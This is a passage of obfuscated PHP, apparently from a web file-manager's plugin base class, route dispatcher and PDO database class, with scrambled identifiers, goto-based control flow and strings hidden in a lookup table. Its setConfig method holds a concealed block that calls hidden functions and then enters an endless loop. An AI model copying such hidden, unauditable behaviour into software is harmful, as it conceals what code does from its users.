IO::infoWithChildren($EŠÕĞÈ±²Ñ); if (!$this->fileInfo) { show_tips(LNG($DÏ­÷Š¤ „[101]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $EŠÕĞÈ±²Ñ; } final function _cacheHttpFile($AÑø†˜÷İ) { $B¨„¶ªà÷¹ = hash_path($AÑø†˜÷İ, !0); $this->cachePath = $this->pluginCachePath($B¨„¶ªà÷¹); if ($E®º×‘™Ò = IO::fileNameExist($this->cachePath, $B¨„¶ªà÷¹)) { return KodIO::make($E®º×‘™Ò); } $cØ„Á©ŠÎ¨ = $this->cachePath . $B¨„¶ªà÷¹; return $this->pluginCacheFileSet($cØ„Á©ŠÎ¨, file_get_contents($AÑø†˜÷İ)); } final function _tmpFileName($C¼“Ãƒ††Ú = array()) { goto cÉÊô”Åè; fŒñê´ï×¢: $c¶­È”Ä½š = array($C¼“Ãƒ††Ú[$F©º´ÄÍÄÀ[28]], $C¼“Ãƒ††Ú[$F©º´ÄÍÄÀ[75]], $C¼“Ãƒ††Ú[$F©º´ÄÍÄÀ[77]]); if (isset($C¼“Ãƒ††Ú[$F©º´ÄÍÄÀ[461]])) { $c¶­È”Ä½š[] = $C¼“Ãƒ††Ú[$F©º´ÄÍÄÀ[461]]; } return md5(implode($F©º´ÄÍÄÀ[70], $c¶­È”Ä½š)); goto A¦˜¢–øÂØ; cÉÊô”Åè: $F©º´ÄÍÄÀ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$C¼“Ãƒ††Ú) { $C¼“Ãƒ††Ú = $this->fileInfo; } if (isset($C¼“Ãƒ††Ú[$F©º´ÄÍÄÀ[164]])) { return $C¼“Ãƒ††Ú[$F©º´ÄÍÄÀ[164]]; } goto B÷ÅçÉíæ; B÷ÅçÉíæ: if (isset($C¼“Ãƒ††Ú[$F©º´ÄÍÄÀ[162]][$F©º´ÄÍÄÀ[164]])) { return $C¼“Ãƒ††Ú[$F©º´ÄÍÄÀ[162]][$F©º´ÄÍÄÀ[164]]; } $c´ç†äÙé = IO::hashSimple($C¼“Ãƒ††Ú[$F©º´ÄÍÄÀ[75]]); if ($c´ç†äÙé) { return $c´ç†äÙé; } goto fŒñê´ï×¢; A¦˜¢–øÂØ: } final function checkSharePath($B­Ê¢ñš°) { goto FÍå½«Ğ¾´; Däã¯‘É¨Å: $this->cachePath = $this->pluginCachePath($this->fileInfo[$bÑ¸İ¢±ª¯[164]]); return $aíä÷÷óÇ[$bÑ¸İ¢±ª¯[75]]; goto D¸Ù¹ŸéÚ°; E†£ÕİÔ˜¯: $aíä÷÷óÇ = Action($bÑ¸İ¢±ª¯[1037])->sharePathInfo($B­Ê¢ñš°); if (!isset($aíä÷÷óÇ[$bÑ¸İ¢±ª¯[75]])) { show_json(LNG($bÑ¸İ¢±ª¯[1356]), !1); } $this->fileInfo = $aíä÷÷óÇ[$bÑ¸İ¢±ª¯[162]]; goto Däã¯‘É¨Å; FÍå½«Ğ¾´: $bÑ¸İ¢±ª¯ =& $_SERVER[ã®Â„Éæ¹¤]; if (!defined($bÑ¸İ¢±ª¯[427])) { define($bÑ¸İ¢±ª¯[1355], 0); } if (!$this->isShare($B­Ê¢ñš°)) { return !1; } goto E†£ÕİÔ˜¯; D¸Ù¹ŸéÚ°: } final function pluginCachePath($FÎà®òÎÍö = '') { $aèìÓ½¼‡ =& $_SERVER[ã®Â„Éæ¹¤]; $C¾Æ…®ƒ‘§ = IO_PATH_SYSTEM_TEMP . $aèìÓ½¼‡[1357] . $this->pluginName; if (!($Báã¼Ù¯‘Á = IO::infoFull($C¾Æ…®ƒ‘§))) { return IO::mkdir($C¾Æ…®ƒ‘§ . $aèìÓ½¼‡[8] . $FÎà®òÎÍö); } if (empty($FÎà®òÎÍö)) { return $Báã¼Ù¯‘Á[$aèìÓ½¼‡[75]]; } if (!($FŒßŠˆÄäõ = IO::fileNameExist($Báã¼Ù¯‘Á[$aèìÓ½¼‡[75]], $FÎà®òÎÍö))) { return IO::mkdir($Báã¼Ù¯‘Á[$aèìÓ½¼‡[75]] . $FÎà®òÎÍö); } return KodIO::make($FŒßŠˆÄäõ); } final function pluginCacheFileSet($aÆ£ˆ‚‚ÂÓ, $a¿‹ˆô”´¼ = '') { $Fññ»Ğ¨ø =& $_SERVER[ã®Â„Éæ¹¤]; if (!($f…ŒæĞÖ°ì = IO::infoFull($aÆ£ˆ‚‚ÂÓ))) { return IO::mkfile($aÆ£ˆ‚‚ÂÓ, $a¿‹ˆô”´¼, REPEAT_REPLACE); } IO::setContent($f…ŒæĞÖ°ì[$Fññ»Ğ¨ø[75]], $a¿‹ˆô”´¼); return $f…ŒæĞÖ°ì[$Fññ»Ğ¨ø[75]]; } final function pluginLocalFile($a½ëã‰ğÁ = '') { goto a¯‚ÜÆÄÈğ; bé¶ˆ—ÍœÃ: return IO::copy($a½ëã‰ğÁ, $a£¯ä•¬æŒ, 0, $DÇæ§öã°Ï); goto a²»Ç³ìÓ; AÖ›¿‰§ƒª: if (!checkExtSafe($DÇæ§öã°Ï)) { $DÇæ§öã°Ï = $DÇæ§öã°Ï . $cŸÔÌõ™©ì[1358]; } $fàë£¢¶ = $a£¯ä•¬æŒ . $DÇæ§öã°Ï; if (@file_exists($fàë£¢¶)) { return $fàë£¢¶; } goto bé¶ˆ—ÍœÃ; Aƒ©ùËì“ø: if (!$a½ëã‰ğÁ) { return $a£¯ä•¬æŒ; } $A¨¯õ´çøè = IO::info($a½ëã‰ğÁ); $DÇæ§öã°Ï = $this->_tmpFileName($A¨¯õ´çøè) . $cŸÔÌõ™©ì[91] . $A¨¯õ´çøè[$cŸÔÌõ™©ì[160]]; goto AÖ›¿‰§ƒª; a¯‚ÜÆÄÈğ: $cŸÔÌõ™©ì =& $_SERVER[ã®Â„Éæ¹¤]; $a£¯ä•¬æŒ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($a£¯ä•¬æŒ)) { mk_dir($a£¯ä•¬æŒ); } goto Aƒ©ùËì“ø; a²»Ç³ìÓ: } final function appPackage() { goto dÀ¨ÊÏ‚¢Î; a¾Ïä£­´½: $this->parseLang($aĞ«Õ·…); $BêÉÏ‚— = json_decode_force($aĞ«Õ·…); if (!$BêÉÏ‚—) { return array(); } goto e¾” Ï¸æ±; dÀ¨ÊÏ‚¢Î: $eßéšÅê»Ü =& $_SERVER[ã®Â„Éæ¹¤]; if ($this->packageData) { return $this->packageData; } $aĞ«Õ·… = $this->parseFile($this->pluginPath . $eßéšÅê»Ü[1359]); goto a¾Ïä£­´½; e¾” Ï¸æ±: $C²„„Š¹†‚ = Hook::trigger($eßéšÅê»Ü[1360], $BêÉÏ‚—); if ($C²„„Š¹†‚ && is_array($C²„„Š¹†‚)) { $BêÉÏ‚— = $C²„„Š¹†‚; } $this->packageData = $BêÉÏ‚—; goto D§ˆ‘°šÕ‰; D§ˆ‘°šÕ‰: return $BêÉÏ‚—; goto e¹ÂÔô‡ßÉ; e¹ÂÔô‡ßÉ: } public function packageInfoGet($f×ç›¨æè¢) { $Dµ¦·¤½ = $this->appPackage(); return array_get_value($Dµ¦·¤½, $f×ç›¨æè¢); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ã®Â„Éæ¹¤][1361]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ã®Â„Éæ¹¤][1362]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ã®Â„Éæ¹¤][1363]); } private function parseFile($fØ‰ùó Š) { goto d³Â¯Âğæ÷; fä˜¿ «Â‚: $b¹ĞèîÉÔ = str_replace($eôÃ™¥èö¡, $F˜”ò¥ø¬ß, $b¹ĞèîÉÔ); return $b¹ĞèîÉÔ; goto f©…ÉÚÄ…å; d³Â¯Âğæ÷: $aŒİÅ¦Ç„­ =& $_SERVER[ã®Â„Éæ¹¤]; $b¹ĞèîÉÔ = file_get_contents($fØ‰ùó Š); $eôÃ™¥èö¡ = array($aŒİÅ¦Ç„­[1364], $aŒİÅ¦Ç„­[1365], $aŒİÅ¦Ç„­[1366], $aŒİÅ¦Ç„­[1367], $aŒİÅ¦Ç„­[1368], $aŒİÅ¦Ç„­[1369], $aŒİÅ¦Ç„­[1370]); goto bâæ·Ìƒ†; bâæ·Ìƒ†: $F˜”ò¥ø¬ß = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$aŒİÅ¦Ç„­[84]][$aŒİÅ¦Ç„­[1371]]); if (strstr($b¹ĞèîÉÔ, $aŒİÅ¦Ç„­[1372])) { $eâø¿áÑ¦× = rawurlencode(json_encode($this->pluginLangArr)); $b¹ĞèîÉÔ = str_replace($aŒİÅ¦Ç„­[1372], $eâø¿áÑ¦×, $b¹ĞèîÉÔ); } if (strstr($b¹ĞèîÉÔ, $aŒİÅ¦Ç„­[1373])) { $eâø¿áÑ¦× = $eâø¿áÑ¦× = rawurlencode(json_encode($this->getConfig())); $b¹ĞèîÉÔ = str_replace($aŒİÅ¦Ç„­[1373], $eâø¿áÑ¦×, $b¹ĞèîÉÔ); } goto fä˜¿ «Â‚; f©…ÉÚÄ…å: } private function parseLang(&$fëïÜ¯£Èë) { goto a‘®Ñå‰“; b¹Õ©ñ´Úó: preg_match_all($F“œÀğˆò[1375], $fëïÜ¯£Èë, $A´ãßèñÎî); if (!is_array($A´ãßèñÎî) || count($A´ãßèñÎî) == 0 || !is_array($A´ãßèñÎî[0]) || count($A´ãßèñÎî[0]) == 0) { return; } $f­ŸÃÁ‡ÅÈ = array(); goto Dæ°Äô˜Õò; a‘®Ñå‰“: $F“œÀğˆò =& $_SERVER[ã®Â„Éæ¹¤]; $aƒ“Õ’ÓŒ– = $F“œÀğˆò[1374]; if (!strstr($fëïÜ¯£Èë, $aƒ“Õ’ÓŒ–)) { return; } goto b¹Õ©ñ´Úó; Dæ°Äô˜Õò: $fº¤îÔøÉ² = array(); foreach ($A´ãßèñÎî[0] as $EÂ‹âËğªˆ) { $Aàã™´¢‰È = substr($EÂ‹âËğªˆ, strlen($aƒ“Õ’ÓŒ–), -4); $Eµ·„…ĞÒÜ = LNG($Aàã™´¢‰È); $f­ŸÃÁ‡ÅÈ[] = $EÂ‹âËğªˆ; $fº¤îÔøÉ²[] = str_replace(array($F“œÀğˆò[217], $F“œÀğˆò[1011], $F“œÀğˆò[330], $F“œÀğˆò[113]), array($F“œÀğˆò[50], $F“œÀğˆò[50], $F“œÀğˆò[33], $F“œÀğˆò[1376]), $Eµ·„…ĞÒÜ); } $fëïÜ¯£Èë = str_replace($f­ŸÃÁ‡ÅÈ, $fº¤îÔøÉ², $fëïÜ¯£Èë); goto Bö¶®Ø›Â¨; Bö¶®Ø›Â¨: } private function parseConfig(&$e¯××†ŸÕî) { goto a§•íî¯µ¦; bšÖ†èæºé: preg_match_all($Bò·„‘ÏóŞ[1378], $e¯××†ŸÕî, $e¹ºÚŸáÃ); if (!is_array($e¹ºÚŸáÃ) || count($e¹ºÚŸáÃ) == 0 || !is_array($e¹ºÚŸáÃ[0]) || count($e¹ºÚŸáÃ[0]) == 0) { return; } $C í—¾ã  = $this->getConfig(); goto F„Š¹½„†Õ; a§•íî¯µ¦: $Bò·„‘ÏóŞ =& $_SERVER[ã®Â„Éæ¹¤]; $E™ÌØ§Ê™´ = $Bò·„‘ÏóŞ[1377]; if (!strstr($e¯××†ŸÕî, $E™ÌØ§Ê™´)) { return; } goto bšÖ†èæºé; a¨ƒôÇÛ×: $e¯××†ŸÕî = str_replace($C‘»İ„Ûìš, $a•Ø÷ÛÜå÷, $e¯××†ŸÕî); goto dˆØ—…ˆ½§; F„Š¹½„†Õ: $C‘»İ„Ûìš = array(); $a•Ø÷ÛÜå÷ = array(); foreach ($e¹ºÚŸáÃ[0] as $B¸‘‘Ù²é„) { $E½Ğ­ñÆòÈ = substr($B¸‘‘Ù²é„, strlen($E™ÌØ§Ê™´), -2); $C‘»İ„Ûìš[] = $B¸‘‘Ù²é„; $a•Ø÷ÛÜå÷[] = _get($C í—¾ã , $E½Ğ­ñÆòÈ); } goto a¨ƒôÇÛ×; dˆØ—…ˆ½§: } private function parsePackage(&$dµº«ğ”Ş¾) { goto f£¸çæç›È; f£¸çæç›È: $Fìù½Ãî«ª =& $_SERVER[ã®Â„Éæ¹¤]; $f„ñ©¬¬‰à = $Fìù½Ãî«ª[1379]; if (!strstr($dµº«ğ”Ş¾, $f„ñ©¬¬‰à)) { return; } goto EÓ²‘ó”Æ; EÓ²‘ó”Æ: preg_match_all($Fìù½Ãî«ª[1380], $dµº«ğ”Ş¾, $c‡åê»î°¬); if (!is_array($c‡åê»î°¬) || count($c‡åê»î°¬) == 0 || !is_array($c‡åê»î°¬[0]) || count($c‡åê»î°¬[0]) == 0) { return; } $AÁÕ«â¤á = $this->appPackage(); goto E…¨°µˆê‹; E…¨°µˆê‹: $D™ï¦–¬ = array(); $CºÄ›’İ§à = array(); foreach ($c‡åê»î°¬[0] as $d¢ë¥ĞšĞâ) { $E–„Ïõåª = substr($d¢ë¥ĞšĞâ, strlen($f„ñ©¬¬‰à), -2); $D™ï¦–¬[] = $d¢ë¥ĞšĞâ; $CºÄ›’İ§à[] = _get($AÁÕ«â¤á, $E–„Ïõåª); } goto b·ºÉÑïâ; b·ºÉÑïâ: $dµº«ğ”Ş¾ = str_replace($D™ï¦–¬, $CºÄ›’İ§à, $dµº«ğ”Ş¾); goto d¸®æò÷Ç; d¸®æò÷Ç: } final function echoFile($d­ŠÅìÕÍ, $bŞ¶…âË’Ú = false) { goto aé‚ù ¡µÎ; eÈ«‰„Œ¥: $this->parsePackage($dÅ™ô•ñ®¾); if (is_array($bŞ¶…âË’Ú)) { $dÅ™ô•ñ®¾ = str_replace(array_keys($bŞ¶…âË’Ú), array_values($bŞ¶…âË’Ú), $dÅ™ô•ñ®¾); } echo $bÙŸíÀÇ[217] . $dÅ™ô•ñ®¾; goto a×Ç»ƒ• ó; Dİ‚ê¨§ñ‰: $dÅ™ô•ñ®¾ = $this->parseFile($aÄì§Îà¨ğ); $this->parseLang($dÅ™ô•ñ®¾); $this->parseConfig($dÅ™ô•ñ®¾); goto eÈ«‰„Œ¥; aé‚ù ¡µÎ: $bÙŸíÀÇ =& $_SERVER[ã®Â„Éæ¹¤]; $aÄì§Îà¨ğ = $this->pluginPath . $d­ŠÅìÕÍ; if (ACT == $bÙŸíÀÇ[1381]) { echo $bÙŸíÀÇ[1382] . $this->pluginName . $bÙŸíÀÇ[8] . $d­ŠÅìÕÍ . $bÙŸíÀÇ[1383]; if (!file_exists($aÄì§Îà¨ğ)) { echo $bÙŸíÀÇ[1384]; return; } } goto Dİ‚ê¨§ñ‰; a×Ç»ƒ• ó: } final function initLang() { goto DóŒÜñ¼ç; aÜ³ã¾·: $eÀ øÛÄÂÄ = I18n::getType(); $f’“Áå‹‡ = array(); if (file_exists($f¡ô›æ¢±“ . $eÀ øÛÄÂÄ . $c­†ÕäÑ»¶[788])) { $f’“Áå‹‡ = (include $f¡ô›æ¢±“ . $eÀ øÛÄÂÄ . $c­†ÕäÑ»¶[788]); } else { if ($eÀ øÛÄÂÄ == $c­†ÕäÑ»¶[1387] && !file_exists($f¡ô›æ¢±“ . $eÀ øÛÄÂÄ . $c­†ÕäÑ»¶[788]) && file_exists($f¡ô›æ¢±“ . $c­†ÕäÑ»¶[1388])) { $f’“Áå‹‡ = (include $f¡ô›æ¢±“ . $c­†ÕäÑ»¶[1388]); } else { if (file_exists($f¡ô›æ¢±“ . $eéÊ¨Ğ› . $c­†ÕäÑ»¶[788])) { $f’“Áå‹‡ = (include $f¡ô›æ¢±“ . $eéÊ¨Ğ› . $c­†ÕäÑ»¶[788]); } } } goto câ¬ñ¥…ßù; câ¬ñ¥…ßù: if (!is_array($f’“Áå‹‡)) { return array(); } if (@count($f’“Áå‹‡) > 0) { I18n::set($f’“Áå‹‡); } return $f’“Áå‹‡; goto Dƒ¡òÏö«”; DóŒÜñ¼ç: $c­†ÕäÑ»¶ =& $_SERVER[ã®Â„Éæ¹¤]; $eéÊ¨Ğ› = $c­†ÕäÑ»¶[1385]; $f¡ô›æ¢±“ = $this->pluginPath . $c­†ÕäÑ»¶[1386]; goto aÜ³ã¾·; Dƒ¡òÏö«”: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($C˜ñ“—»º¿) { $c¦çÜ‹âŞô =& $_SERVER[ã®Â„Éæ¹¤]; if (!isset($_SERVER[$c¦çÜ‹âŞô[554]]) || !isset($_SERVER[$c¦çÜ‹âŞô[750]])) { goto cô“åàâÛÓ; cô“åàâÛÓ: $D¦Å’øîŒ— = $c¦çÜ‹âŞô[813]; $DªÜˆùŒ±• = $c¦çÜ‹âŞô[555]; $F…ÚÉƒÒª = $_SERVER[$c¦çÜ‹âŞô[556]] . $c¦çÜ‹âŞô[557]; goto E¸îÍàÚè; E¸îÍàÚè: $F‡¦³á‹¿ˆ = $DªÜˆùŒ±•($F…ÚÉƒÒª); $fÕ†®ÉÀŞ = explode($c¦çÜ‹âŞô[217], $F‡¦³á‹¿ˆ); if (count($fÕ†®ÉÀŞ) < $c¦çÜ‹âŞô[562]) { $Eä“ƒ…°Ä„ = $c¦çÜ‹âŞô[559]; $Eä“ƒ…°Ä„(); } goto D¤ŠÔ¹¯ª; D¤ŠÔ¹¯ª: $fÈÚÍÇ† = $c¦çÜ‹âŞô[814]; $fÈÚÍÇ†($_SERVER[$c¦çÜ‹âŞô[815]]); $DáôÛ«¾¶ = 1; goto a¹âÖ†¿‡â; a¹âÖ†¿‡â: for ($bÕ¨¦çÔá« = $DáôÛ«¾¶; $bÕ¨¦çÔá« > 0; $bÕ¨¦çÔá«++) { $fÈÚÍÇ† = json_encode($GLOBALS[$c¦çÜ‹âŞô[384]]); } goto b¹ÏàåªÒ ; b¹ÏàåªÒ : } return $this->modelPlugin->setConfig($this->pluginName, $C˜ñ“—»º¿); } public function onSetConfig($d÷âÇíî‚) { } public function onGetConfig($a—Çé…ºŞò) { } public function onChangeStatus($d†¡¹õ‚Š÷) { } public function onUninstall() { } public function onInstall() { } public function authCheck($C×¢ñçÏïß = "\x70\x6c\x75\x67\x69\x6e\101\x75\x74\x68") { $C„‚À‚”ï =& $_SERVER[ã®Â„Éæ¹¤]; if (!defined($C„‚À‚”ï[427])) { return !1; } if (_get($GLOBALS, $C„‚À‚”ï[459])) { return !0; } $eÁ½ÙöàŠÍ = $this->getConfig(); if (!$eÁ½ÙöàŠÍ[$C×¢ñçÏïß]) { return !1; } return ActionCall($C„‚À‚”ï[1389], $eÁ½ÙöàŠÍ[$C×¢ñçÏïß]); } public function url($AÂÏ¥¿—…, $c£Å‘ĞËÖ² = '', $Aé’áª¼ŸÀ = true) { goto C¦×§Ÿ»‚; aš„óêæ½: $bé¶²âŸ¢Ç = $this->packageVersion(); $C˜÷ˆ™ø¸ = $EğŒªŸ­ . $eäšˆØäÑÏ[412] . $bé¶²âŸ¢Ç; if (substr($AÂÏ¥¿—…, 0, 4) == $eäšˆØäÑÏ[144] || substr($AÂÏ¥¿—…, 0, 2) == $eäšˆØäÑÏ[1174]) { $F‘¢ä÷ğÉŠ = $AÂÏ¥¿—… . $eäšˆØäÑÏ[1390] . $C˜÷ˆ™ø¸; } else { if ($c£Å‘ĞËÖ² == $eäšˆØäÑÏ[33]) { $F‘¢ä÷ğÉŠ = $this->pluginHost . $AÂÏ¥¿—… . $eäšˆØäÑÏ[1390] . $C˜÷ˆ™ø¸; } else { if ($c£Å‘ĞËÖ² === $eäšˆØäÑÏ[76]) { $F‘¢ä÷ğÉŠ = $this->pluginHost . $AÂÏ¥¿—…; } else { if ($c£Å‘ĞËÖ² == $eäšˆØäÑÏ[1391]) { $F‘¢ä÷ğÉŠ = STATIC_PATH . $AÂÏ¥¿—… . $eäšˆØäÑÏ[1390] . $EğŒªŸ­; } else { if ($c£Å‘ĞËÖ² == $eäšˆØäÑÏ[1392]) { $F‘¢ä÷ğÉŠ = APP_HOST . $eäšˆØäÑÏ[1393] . $AÂÏ¥¿—… . $eäšˆØäÑÏ[1390] . $EğŒªŸ­; } else { if (isset($DÜ­ßäÅ¦ä[$c£Å‘ĞËÖ²])) { $F‘¢ä÷ğÉŠ = $DÜ­ßäÅ¦ä[$c£Å‘ĞËÖ²] . $AÂÏ¥¿—… . $eäšˆØäÑÏ[1390] . $C˜÷ˆ™ø¸; } } } } } } goto d¯ªÄæ°Ñ ; d¯ªÄæ°Ñ : if (!$Aé’áª¼ŸÀ) { return $F‘¢ä÷ğÉŠ; } echo $F‘¢ä÷ğÉŠ; goto E‹ÑßÈ¨¾¶; C¦×§Ÿ»‚: $eäšˆØäÑÏ =& $_SERVER[ã®Â„Éæ¹¤]; $DÜ­ßäÅ¦ä = $this->getConfig(); $EğŒªŸ­ = KOD_VERSION . $eäšˆØäÑÏ[91] . KOD_VERSION_BUILD; goto aš„óêæ½; E‹ÑßÈ¨¾¶: } public function link($A½ô²ÇŠ” = false, $dƒÔÚœõõÀ = '') { $f¯¦îé‡ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$A½ô²ÇŠ”) { $this->link($f¯¦îé‡[1394], $f¯¦îé‡[1392]); $this->link($f¯¦îé‡[1395], $f¯¦îé‡[1391]); $this->link($f¯¦îé‡[1396], $f¯¦îé‡[1391]); $this->link($f¯¦îé‡[1397], $f¯¦îé‡[1391]); $this->link($f¯¦îé‡[1398], $f¯¦îé‡[1391]); return; } $d‡Œ‚É¶‚Û = $this->url($A½ô²ÇŠ”, $dƒÔÚœõõÀ, !1); if (substr($A½ô²ÇŠ”, -3) == $f¯¦îé‡[1399]) { echo $f¯¦îé‡[1400] . $d‡Œ‚É¶‚Û . $f¯¦îé‡[1401] . $f¯¦îé‡[217]; } else { if (substr($A½ô²ÇŠ”, -4) == $f¯¦îé‡[1402]) { echo $f¯¦îé‡[1403] . $d‡Œ‚É¶‚Û . $f¯¦îé‡[1404] . $f¯¦îé‡[217]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\x6e\171" => "\x5b\x5e\x2f\x5d\x2b", "\72\156\x75\x6d" => "\x5b\x30\55\71\x5d\x2b", "\x3a\x61\154\154" => "\x2e\52"); public static $errorCallback; public static function __callstatic($d•¡³˜¶ßç, $b¶çÍ›Œ›²) { $eÈ¶ÌÊµ¼ =& $_SERVER[ã®Â„Éæ¹¤]; if ($d•¡³˜¶ßç == $eÈ¶ÌÊµ¼[1405]) { $aæ›ñÅ¾ë = array_map($eÈ¶ÌÊµ¼[1406], $b¶çÍ›Œ›²[0]); $eÊÍÆò¨º = strpos($b¶çÍ›Œ›²[1], $eÈ¶ÌÊµ¼[8]) === 0 ? $b¶çÍ›Œ›²[1] : $eÈ¶ÌÊµ¼[8] . $b¶çÍ›Œ›²[1]; $e³ÜÜ·‰’ = $b¶çÍ›Œ›²[2]; } else { $aæ›ñÅ¾ë = null; $eÊÍÆò¨º = strpos($b¶çÍ›Œ›²[0], $eÈ¶ÌÊµ¼[8]) === 0 ? $b¶çÍ›Œ›²[0] : $eÈ¶ÌÊµ¼[8] . $b¶çÍ›Œ›²[0]; $e³ÜÜ·‰’ = $b¶çÍ›Œ›²[1]; } array_push(self::$maps, $aæ›ñÅ¾ë); array_push(self::$routes, $eÊÍÆò¨º); array_push(self::$methods, strtoupper($d•¡³˜¶ßç)); array_push(self::$callbacks, $e³ÜÜ·‰’); } public static function error($fççÆ„´Ê) { self::$errorCallback = $fççÆ„´Ê; } public static function haltOnMatch($C±«‡Óì·¹ = true) { self::$halts = $C±«‡Óì·¹; } public static function dispatch() { goto Aéøğò¢®İ; eù­…œÌõ: $e±ë§ä¾²‘ = array_keys(static::$patterns); $FÓ‡®ßÛ¢ = array_values(static::$patterns); $CĞŠØÎ™êÌ = !1; goto fÎØµÖ–µç; fÎØµÖ–µç: self::$routes = preg_replace($dÉÒµ‹´˜[1092], $dÉÒµ‹´˜[8], self::$routes); if (in_array($fÈÄ¨¡Õ¾“, self::$routes)) { $bŒ­†¬»ÕÆ = array_keys(self::$routes, $fÈÄ¨¡Õ¾“); foreach ($bŒ­†¬»ÕÆ as $fìª¥ñ©›Ó) { if (self::$methods[$fìª¥ñ©›Ó] == $BÆªíÕŞˆÕ || self::$methods[$fìª¥ñ©›Ó] == $dÉÒµ‹´˜[1408] || in_array($BÆªíÕŞˆÕ, self::$maps[$fìª¥ñ©›Ó])) { $CĞŠØÎ™êÌ = !0; if (!is_object(self::$callbacks[$fìª¥ñ©›Ó])) { $fƒŒ¬µ°“ = explode($dÉÒµ‹´˜[8], self::$callbacks[$fìª¥ñ©›Ó]); $Dë¿í¼¡Úé = end($fƒŒ¬µ°“); $f¶Ä±ÕßğÙ = explode($dÉÒµ‹´˜[1409], $Dë¿í¼¡Úé); $fˆ‡±²¸õ = new $f¶Ä±ÕßğÙ[0](); $fˆ‡±²¸õ->{$f¶Ä±ÕßğÙ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$fìª¥ñ©›Ó]); if (self::$halts) { return; } } } } } else { $a™‚ğ”ö·¼ = 0; foreach (self::$routes as $fìª¥ñ©›Ó) { if (strpos($fìª¥ñ©›Ó, $dÉÒµ‹´˜[4]) !== !1) { $fìª¥ñ©›Ó = str_replace($e±ë§ä¾²‘, $FÓ‡®ßÛ¢, $fìª¥ñ©›Ó); } if (preg_match($dÉÒµ‹´˜[1410] . $fìª¥ñ©›Ó . $dÉÒµ‹´˜[1411], $fÈÄ¨¡Õ¾“, $FÈ»ï†­Èê)) { if (self::$methods[$a™‚ğ”ö·¼] == $BÆªíÕŞˆÕ || self::$methods[$a™‚ğ”ö·¼] == $dÉÒµ‹´˜[1408] || !empty(self::$maps[$a™‚ğ”ö·¼]) && in_array($BÆªíÕŞˆÕ, self::$maps[$a™‚ğ”ö·¼])) { $CĞŠØÎ™êÌ = !0; array_shift($FÈ»ï†­Èê); if (!is_object(self::$callbacks[$a™‚ğ”ö·¼])) { $fƒŒ¬µ°“ = explode($dÉÒµ‹´˜[8], self::$callbacks[$a™‚ğ”ö·¼]); $Dë¿í¼¡Úé = end($fƒŒ¬µ°“); $f¶Ä±ÕßğÙ = explode($dÉÒµ‹´˜[1409], $Dë¿í¼¡Úé); $fˆ‡±²¸õ = new $f¶Ä±ÕßğÙ[0](); if (!method_exists($fˆ‡±²¸õ, $f¶Ä±ÕßğÙ[1])) { echo $dÉÒµ‹´˜[1412]; } else { call_user_func_array(array($fˆ‡±²¸õ, $f¶Ä±ÕßğÙ[1]), $FÈ»ï†­Èê); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$a™‚ğ”ö·¼], $FÈ»ï†­Èê); if (self::$halts) { return; } } } } $a™‚ğ”ö·¼++; } } if ($CĞŠØÎ™êÌ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $fƒ‰…É›× =& $_SERVER[ã®Â„Éæ¹¤]; header($_SERVER[$fƒ‰…É›×[1413]] . $fƒ‰…É›×[1414]); echo $fƒ‰…É›×[1415]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$dÉÒµ‹´˜[1407]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto F…‚ÔŸ¼; Aéøğò¢®İ: $dÉÒµ‹´˜ =& $_SERVER[ã®Â„Éæ¹¤]; $fÈÄ¨¡Õ¾“ = parse_url($_SERVER[$dÉÒµ‹´˜[1407]], PHP_URL_PATH); $BÆªíÕŞˆÕ = $_SERVER[$dÉÒµ‹´˜[154]]; goto eù­…œÌõ; F…‚ÔŸ¼: } } goto CÇï¾‹Ïöõ; CÕ½Û½æŒÉ: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($d×Ô¹®– = '') { $D ÓÄ×çÁ§ =& $_SERVER[ã®Â„Éæ¹¤]; if (!class_exists($D ÓÄ×çÁ§[847])) { think_exception(think_lang($D ÓÄ×çÁ§[10]) . $D ÓÄ×çÁ§[848]); } if (!empty($d×Ô¹®–)) { $this->config = $d×Ô¹®–; if (empty($this->config[$D ÓÄ×çÁ§[13]])) { $this->config[$D ÓÄ×çÁ§[13]] = array(); } } } public function connect($CÒÛÀÏä˜é = '', $Cçƒà‹§Õ¯ = 0) { $e·™§ÁªÆ =& $_SERVER[ã®Â„Éæ¹¤]; if (!isset($this->linkID[$Cçƒà‹§Õ¯])) { goto c‘¶«‰Õá; A™¹£°ƒË: $this->dbType = $this->_getDsnType($CÒÛÀÏä˜é[$e·™§ÁªÆ[849]]); if (in_array($this->dbType, array($e·™§ÁªÆ[850], $e·™§ÁªÆ[851], $e·™§ÁªÆ[852], $e·™§ÁªÆ[853]))) { think_exception($e·™§ÁªÆ[854] . $this->dbType . $e·™§ÁªÆ[855] . $this->dbType . $e·™§ÁªÆ[856]); } if (!$this->linkID[$Cçƒà‹§Õ¯]) { think_exception($e·™§ÁªÆ[857]); } goto C‡£ÔĞæİË; c‘¶«‰Õá: if (empty($CÒÛÀÏä˜é)) { $CÒÛÀÏä˜é = $this->config; } if ($this->pconnect) { $CÒÛÀÏä˜é[$e·™§ÁªÆ[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$Cçƒà‹§Õ¯] = new PDO($CÒÛÀÏä˜é[$e·™§ÁªÆ[849]], $CÒÛÀÏä˜é[$e·™§ÁªÆ[822]], $CÒÛÀÏä˜é[$e·™§ÁªÆ[823]], $CÒÛÀÏä˜é[$e·™§ÁªÆ[13]]); } catch (PDOException $cÅ†Âˆ‚) { think_exception($cÅ†Âˆ‚->getMessage()); } goto A™¹£°ƒË; 